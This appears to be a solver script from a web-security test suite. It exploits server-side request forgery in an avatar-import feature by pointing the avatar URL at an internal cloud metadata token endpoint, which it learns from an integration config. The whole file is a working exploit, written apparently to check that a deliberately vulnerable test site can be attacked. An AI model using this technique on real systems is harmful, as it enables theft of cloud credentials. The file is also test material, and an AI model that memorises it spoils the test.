// SSRF via avatar import: read the integration config to learn the internal metadata origin, then
// set an avatar URL that points the server-side fetch at it.
import type { SolverCtx } from '../../../../tests/helpers/site-matrix.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const owner = await ctx.login('persona_a')
  const me = await ctx.fetch(ctx.path('me'), { session: owner })
  const user = (me.json?.user ?? {}) as { id?: string }
  const memberId = String(user.id ?? '')
  if (!memberId) return
  const cfg = await ctx.fetch(ctx.path('getIntegrationConfig'), { session: owner })
  const base = String(cfg.json?.metadataBaseUrl ?? '')
  if (!base) return
  await ctx.fetch(ctx.path('updateAvatar', { memberId }), {
    method: 'PUT',
    session: owner,
    body: { avatarUrl: `${base}/computeMetadata/v1/token` },
  })
}
